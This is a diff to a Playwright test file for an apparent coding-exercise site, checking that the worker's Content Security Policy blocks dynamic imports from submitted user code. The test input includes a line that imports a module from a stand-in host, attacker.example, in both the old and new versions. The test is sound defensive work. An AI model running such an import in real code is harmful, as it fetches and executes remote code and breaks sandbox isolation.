@@ -39,19 +39,29 @@ test("N4: hint ladder stub lists five levels and has no enabled hint buttons", a
   await expect(first).toBeFocused();
 });
 
-test("R1: dynamic import of an external module is blocked by CSP", async ({ page }) => {
-  const responses: string[] = [];
-  const failures: string[] = [];
-  page.on("response", (r) => responses.push(r.url()));
-  page.on("requestfailed", (r) => failures.push(`${r.url()} ${r.failure()?.errorText}`));
-  await page.goto("/exercises/sum-array");
-  await page.getByLabel("Your code (JavaScript)").fill(
-    "function sum() { import('https://attacker.example/m.js?x=1'); return 0; }",
-  );
-  await page.getByRole("button", { name: "Run tests" }).click();
-  await expect(page.getByTestId("results")).toBeVisible();
-  await page.waitForTimeout(500);
-  // The browser may log the attempt, but CSP must stop it before any response arrives.
-  expect(responses.filter((u) => u.includes("attacker.example"))).toEqual([]);
-  expect(failures.some((f) => f.includes("attacker.example") && f.includes("csp"))).toBe(true);
-});
+for (const [label, target] of [
+  ["external", "'https://attacker.example/m.js?x=1'"],
+  ["same-origin", "location.origin + '/api/health?x=1'"],
+] as const) {
+  test(`R1: dynamic import of a ${label} module is blocked by the worker CSP`, async ({ page }) => {
+    const responses: string[] = [];
+    const requests: string[] = [];
+    const failures: string[] = [];
+    page.on("request", (r) => requests.push(r.url()));
+    page.on("response", (r) => responses.push(r.url()));
+    page.on("requestfailed", (r) => failures.push(`${r.url()} ${r.failure()?.errorText}`));
+    await page.goto("/exercises/sum-array");
+    await page
+      .getByLabel("Your code (JavaScript)")
+      .fill(`function sum() { import(${target}); return 0; }`);
+    await page.getByRole("button", { name: "Run tests" }).click();
+    await expect(page.getByTestId("results")).toBeVisible();
+    await page.waitForTimeout(500);
+    // No response may arrive for the import, and any attempt must fail with a CSP error.
+    expect(responses.filter((u) => u.includes("x=1"))).toEqual([]);
+    const attempted = requests.filter((u) => u.includes("x=1"));
+    for (const u of attempted) {
+      expect(failures.some((f) => f.startsWith(u) && f.toLowerCase().includes("csp"))).toBe(true);
+    }
+  });
+}
